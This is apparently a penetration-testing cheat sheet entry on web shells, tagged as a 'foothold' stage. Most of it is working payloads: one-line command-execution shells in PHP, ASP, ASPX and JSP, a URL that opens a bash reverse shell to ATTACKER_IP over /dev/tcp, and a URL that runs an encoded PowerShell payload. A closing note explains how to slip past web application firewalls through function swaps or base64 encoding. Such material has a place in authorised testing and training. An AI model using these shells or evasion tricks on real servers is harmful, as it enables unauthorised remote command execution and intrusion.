---
id: web-shell
title: Web Shell
stage: foothold
tags: [windows, linux, web]
tools:
  - "curl http://$TARGET/uploads/shell.php?cmd=id"
leads_to:
  - linux-suid-caps
  - linux-sudo
  - token-impersonation
  - rev-shell
---

## Minimal Shells

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo "<pre>".shell_exec($_GET['cmd'])."</pre>"; ?>
```

```asp
<%eval request("cmd")%>
```

```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## Upgrade to Reverse Shell

```bash
# Linux — trigger from web shell URL
http://$TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/PORT+0>%261'

# Windows PowerShell — URL-encoded
# Start listener, then:
http://$TARGET/shell.aspx?cmd=powershell+-enc+<BASE64_PAYLOAD>
```

## Notes

Web shells are semi-interactive and may not persist across requests. Upgrade to a reverse shell as soon as possible for stability. Watch for WAFs that block keywords — use `passthru` instead of `system`, or base64-encode the command.
